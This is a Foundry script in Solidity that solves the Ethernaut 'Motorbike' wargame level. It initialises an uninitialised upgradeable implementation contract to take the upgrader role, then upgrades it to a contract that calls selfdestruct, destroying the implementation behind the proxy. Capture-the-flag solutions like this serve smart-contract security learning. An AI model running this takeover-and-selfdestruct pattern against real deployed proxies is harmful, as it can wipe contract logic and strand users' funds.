// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";

// forge script ./script/Level25-Motorbike.s.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv

interface Engine {
    function initialize() external;
    function upgrader() external view returns (address upgrader_);
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

contract Destructive {
    function kill() external {
        selfdestruct(payable(address(0)));
    }
}

contract MotorbikeScript is Script {

    // `contract.address`
    // Motorbike address:  0x9D2F6D374f52eFDF9E65b87F95B1Ab073d90fd62

    // `await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")`
    // Engine address: 0x6b7c98b2205441466a3db270d76a286e3d945dc0
    Engine engine = Engine(0x6B7C98b2205441466a3db270d76a286E3d945Dc0);

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        engine.initialize();
        console2.log("Upgrader is:", engine.upgrader());
        bytes memory encodedData = abi.encodeWithSignature("kill()");

        // Deploy selfdestruct contract at
        address destructive = address(new Destructive());
        engine.upgradeToAndCall(destructive, encodedData);

        vm.stopBroadcast();
    }
}
